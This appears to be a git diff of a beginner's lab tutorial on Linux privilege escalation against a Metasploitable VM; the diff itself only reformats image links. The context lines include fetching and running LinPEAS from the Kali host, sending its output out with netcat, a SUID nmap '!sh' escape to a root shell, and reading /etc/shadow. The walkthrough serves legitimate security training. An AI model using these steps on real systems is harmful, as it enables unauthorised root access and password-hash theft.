@@ -34,7 +34,7 @@ Anything that looks like `this text` is (usually) a command to put in the termin
 	1. login: `bob`
 	2. Password: `bob`
 
-![[./images/Pasted image 20260209145322.png]]
+![Pasted image 20260209145322](./images/Pasted%20image%2020260209145322.png)
 
 ## Get LinPEAS on Kali
 LinPEAS is a tool that needs to be downloaded. On your internet-connected Kali machine, do the following.
@@ -44,7 +44,7 @@ LinPEAS is a tool that needs to be downloaded. On your internet-connected Kali m
 1. Open a terminal (the black icon with $_ in the corner)
 2. `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh`
 
-![[./images/./images/Pasted image 20260209145931.png]]
+![Pasted image 20260209145931](./images/Pasted%20image%2020260209145931.png)
 
 ## Connect the VMs
 Now we need to virtually place Kali and Metasploitable on the same network. Think of it like two devices connected to the same Wi-Fi. The instructions I'll give to do this will be fairly similar regardless of which hypervisor you're using, but will not be 1:1.
@@ -58,22 +58,22 @@ Now we need to virtually place Kali and Metasploitable on the same network. Thin
 	1. Host-only means Kali can talk to Metasploitable, but Metasploitable is isolated from the internet.
 6. Click `Okay`
 
-![[./images/Pasted image 20260209150557.png]]
-![[./images/Pasted image 20260209150206.png]]
+![Pasted image 20260209150557](./images/Pasted%20image%2020260209150557.png)
+![Pasted image 20260209150206](./images/Pasted%20image%2020260209150206.png)
 
 7. Once this is done. POWER OFF BOTH VMS. Then turn them back on again. This will allow the networking changes to take place and make our lives easier.
 
 ### On Metasploitable
 1. `ip a`
 	1. This will display your IP ADDRESS. In my case (as it will likely be different for you), the IP address is *192.168.9.129*. Save this information for later.
-![[./images/Pasted image 20260209151750.png]]
+![Pasted image 20260209151750](./images/Pasted%20image%2020260209151750.png)
 
 ### On Kali
 1. `ip a`
 	1. Ensure your IP address is different from your Metasploitable address (they will likely be very similar). Remember this. My IP address is *192.168.30.128*
 2. `ping <metasploitable_ip_address>`
 	1. You should see some feedback, ensuring the machines can connect to each other.
-![[./images/Pasted image 20260209151628.png]]
+![Pasted image 20260209151628](./images/Pasted%20image%2020260209151628.png)
 
 ---
 ---
@@ -94,11 +94,11 @@ The `linpeas.sh` script is a file. When you run it, it will run on the computer 
 	1. (An alternate way I've found that sometimes takes you to this directory automatically is to type `linpeas.sh --version`)
 2. `python3 -m http.server 8000`
 	1. This will start a server that the Metasploitable computer can connect to and share files.
-![[./images/Pasted image 20260209153329.png]]
+![Pasted image 20260209153329](./images/Pasted%20image%2020260209153329.png)
 ### On Metasploitable
 1. `cat /etc/shadow`
 	1. Right now, Bob cannot view the */etc/shadow* file with all the stored passwords. This needs root access. So let's ignore this for now.
-![[./images/Pasted image 20260209165007.png]] 
+![Pasted image 20260209165007](./images/Pasted%20image%2020260209165007.png) 
 2. `cd /tmp`
 	1. Bob also cannot write files to his own home directory. But he CAN write files to the temporary directory, *tmp*, which is perfect for us right now.
 3. `wget http://<kali_ip>:8000/linpeas.sh`
@@ -107,7 +107,7 @@ The `linpeas.sh` script is a file. When you run it, it will run on the computer 
 5. `./linpeas.sh > linpeas.out`
 	1. Execute.
 
-![[./images/Pasted image 20260209155055.png]]
+![Pasted image 20260209155055](./images/Pasted%20image%2020260209155055.png)
 
 From here, LinPEAS will do its thing, testing all sorts of attack vectors to see if there are any opportunities for us to do some privilege escalation with Bob's account. This may take some time. Just let it run.
 *Note: For the screenshot, you can see me using `linpeas_small.sh`. Here, I was experimenting with a version of linpeas designed to run on older shells, like what Metasploitable uses. However, this is unnecessary. If you use linpeas_small, you will not get a full-size report.*
@@ -122,7 +122,7 @@ If your python server is still running, use Ctrl + c to stop it.
 	1. This moves us to a new folder where we'll save the LinPEAS report.
 3. `nc -lvnp 9001 > linpeas.out`
 	1. This tells Kali to look for the linpeas.out file floating around on the network on port 9001.
-![[./images/Pasted image 20260209155859.png]]
+![Pasted image 20260209155859](./images/Pasted%20image%2020260209155859.png)
 ### On Metasploitable
 1. `nc <kali_ip> 9001 < linpeas.out`
 	1. It may stall here. Just give it about a minute or two. If it doesn't close out on it's own, just Ctrl+c to stop it.
@@ -130,7 +130,7 @@ If your python server is still running, use Ctrl + c to stop it.
 ### On Kali
 1. `ls`
 	1. This just lists which files you have in your current directory. You should see *linpeas.out*.
-![[./images/Pasted image 20260209160155.png]]
+![Pasted image 20260209160155](./images/Pasted%20image%2020260209160155.png)
 2. `less -R linpeas.out`
 
 This last command will open the report. Press `q` to quit at any time. Please skim through this and take a look! Read the legend at the beginning to understand how to interpret this data, and see if you can find anything interesting and exploitable. Have fun!
@@ -139,7 +139,7 @@ This last command will open the report. Press `q` to quit at any time. Please sk
 ## Escape Nmap
 LinPEAS found: `-rwsr-xr-x 1 root root ... /usr/bin/nmap`.
 
-![[./images/Pasted image 20260209163002.png]]
+![Pasted image 20260209163002](./images/Pasted%20image%2020260209163002.png)
 
 There is an ever-growing online resource called **GTFObins**. In their own words:
 
@@ -148,7 +148,7 @@ There is an ever-growing online resource called **GTFObins**. In their own words
 
 LinPEAS will often search for the file binaries listed in GTFObins, and when there's a match, it highlights it, as seen above. Metasploitable uses an older version of nmap, so let's check to see what we can find about nmap at https://gtfobins.org/.
 
-![[./images/Pasted image 20260210171358.png]]
+![Screenshot 2026-02-10 171356](./images/Screenshot%202026-02-10%20171356.png)
 
 GTFObins is giving us instructions for how an unprivileged user can spawn a root shell, which explains why LinPEAS said there's a 95% chance we could abuse this version of nmap for privilege escalation. Let's try this for ourselves.
 
@@ -157,12 +157,12 @@ GTFObins is giving us instructions for how an unprivileged user can spawn a root
 2. `!sh`
 
 This gives us a root shell where we can do whatever we want! To show the change, I used the command `whoami` to ask Metasploitable which account I am. The first time, it was my *demo* account (for you it will be *bob*). Then, after the exploit, whoami returned 
-![[./images/Pasted image 20260209164107.png]]
+![Pasted image 20260209164107](./images/Pasted%20image%2020260209164107.png)
 
 3. `cat /etc/shadow`
 	1. Now we can send this screenshot to M. Inc as proof of our privilege escalation!
 
-![[./images/Pasted image 20260209165418.png]]
+![Pasted image 20260209165418](./images/Pasted%20image%2020260209165418.png)
 
 **Hacker voice: *I'm in.***
 
